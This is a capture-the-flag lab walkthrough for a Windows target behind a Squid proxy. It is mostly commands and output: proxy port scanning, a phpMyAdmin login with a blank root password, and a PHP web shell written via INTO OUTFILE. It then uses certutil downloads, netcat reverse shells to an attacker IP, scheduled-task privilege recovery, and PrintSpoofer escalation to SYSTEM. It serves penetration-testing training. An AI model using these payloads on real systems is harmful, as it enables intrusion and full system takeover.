____

# Exploitation Guide for Squid

## Summary

In this walkthrough, we will exploit the target by enumerating ports behind squid proxy from which we will gain initial foothold on the target through phpMyAdmin. We will then elevate our privilege by creating scheduled tasks to enable some restricted privileges.

## Enumeration

### Nmap

We'll start off with an nmap scan.

```
kali@kali:~$ nmap -sC -sV 192.168.120.223 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 04:38 EDT
Nmap scan report for 192.168.120.223
Host is up (0.18s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-server-header: squid/4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.21 seconds
```

From nmap, we discover that `Squid HTTP Proxy` is running on port `3128`. To enumerate open ports behind squid proxy on the target, we will use a tool called `Spose` from https://github.com/aancw/spose.git.

```
┌──(kali㉿kali)-[~/Desktop/spose]
└─$ python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1
Using proxy address http://192.168.120.223:3128
127.0.0.1 3306 seems OPEN 
127.0.0.1 8080 seems OPEN  
```

The ports open behind the squid proxy are port `8080` and port `3306`. Port `8080` looks like a web server and port `3306` is mysql.

## Exploitation

We will configure our browser to use the target ip and port as a proxy `(192.168.120.223:3128)` using a plugin called [foxyproxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/).

![image](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_109_image_1_edB0FxiI.png)

image

Once the proxy is setup, we browse to http://127.0.0.1:8080. A WAMP Dashboard page is displayed and we can access phpMyAdmin. Using the default credentials, we can log into phpMyAdmin.

```
Username: root
Password: 
```

![image](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_109_image_2_tnIe2yoD.png)

image

Abusing the `into outfile` function in MySQL, we can write a php code to the target's webroot at http://127.0.0.1:8080/phpmyadmin/server_sql.php.

```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
```

Writing php code to target webroot was successful, we can test RCE using curl.

```
┌──(kali㉿kali)-[~/Desktop/spose]
└─$ curl "http://127.0.0.1:8080/shell.php?cmd=whoami" --proxy 192.168.120.223:3128 
nt authority\local service
```

To spawn a reverse shell to our kali machine, we will apply the following steps.

1. Start a python, then transfer `nc.exe` to the target.

```
Terminal 1
┌──(kali㉿kali)-[~/Desktop/spose]
└─$ curl "http://127.0.0.1:8080/shell.php?cmd=certutil+-urlcache+-f+http://192.168.118.23/nc.exe+nc.exe" --proxy 192.168.120.223:3128

Terminal 2
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.223 - - [23/Mar/2022 06:50:55] "GET /nc.exe HTTP/1.1" 200 -
192.168.120.223 - - [23/Mar/2022 06:50:57] "GET /nc.exe HTTP/1.1" 200 -
```

2. Transfer of `nc.exe` was successful. We have to start `netcat` on our kali machine, then execute `nc.exe` from the target.

```
┌──(kali㉿kali)-[~]
└─$ curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+192.168.118.23+445+-e+powershell.exe" --proxy 192.168.120.223:3128
```

3. Connection received on our kali machine.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 192.168.120.223.
Ncat: Connection from 192.168.120.223:50400.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\wamp\www>
```

## Escalation

### Post Enumeration

In the current session, we are running as a LOCAL SERVICE account but some privileges assigned to this account are missing.

```
PS C:\wamp\www>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

From [this resource](https://github.com/itm4n/FullPowers), we find out that when a `LOCAL SERVICE` or `NETWORK SERVICE` is configured to run with a _restricted set of privileges_, permissions can be recovered by creating a `scheduled task`. The new process created by the `Task Scheduler Service` will have **all the default privileges** of the associated user account.

All privileges assigned to this `LOCAL SERVICE` account can be regained by creating a simple task using powershell. More information is available [here](https://itm4n.github.io/localservice-privileges/).

First, we start a listener on our Kali host.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
```

Then, we create a new scheduled task to make a connection back to our listener.

```
PS C:\wamp\www> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

PS C:\wamp\www> Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              GrantPerm                         Ready     

PS C:\wamp\www> Start-ScheduledTask -TaskName "GrantPerm"
```

We receive a connection to our listener and check if the `LOCAL SERVICE` account has all default privileges.

```
Ncat: Connection from 192.168.120.223.
Ncat: Connection from 192.168.120.223:50828.
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeSystemtimePrivilege         Change the system time             Disabled
SeAuditPrivilege              Generate security audits           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
SeTimeZonePrivilege           Change the time zone               Disabled

C:\Windows\system32>
```

Reading through the privileges we have now, it's confirmed that the `SeImpersonatePrivilege` is missing but that can be retrieved by creating a `ScheduledTaskPrincipal` where we can specify `SeImpersonatePrivilege` in `RequiredPrivilege` attribute.

```
# Create a list of privileges
PS C:\Windows\system32> [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"

# Create a Principal for the task 
PS C:\Windows\system32> $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

# Create an action for the task 
PS C:\Windows\system32> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

# Create the task
PS C:\Windows\system32> Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              GrantAllPerms                     Ready     

# Start the task
PS C:\Windows\system32> Start-ScheduledTask -TaskName "GrantAllPerms"
```

`SeImpersonatePrivilege` is enabled on the target now for our `LOCAL SERVICE` account.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.120.223.
Ncat: Connection from 192.168.120.223:50883.
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Windows\system32>
```

With `SeImpersonatePrivilege` enabled on the target for the `LOCAL SERVICE` account, we can abuse this privilege using `PrintSpoofer.exe` from https://github.com/itm4n/PrintSpoofer to create a new `SYSTEM process` in our current console.

```
C:\wamp\www>certutil -urlcache -f http://192.168.118.23/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://192.168.118.23/PrintSpoofer64.exe PrintSpoofer64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

# Checking SeImpersonatePrivilege abuse
C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c whoami"
PrintSpoofer64.exe -i -c "cmd /c whoami"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system

# Creating a new SYSTEM process in our current console
C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

We now have system level access to the target machine!
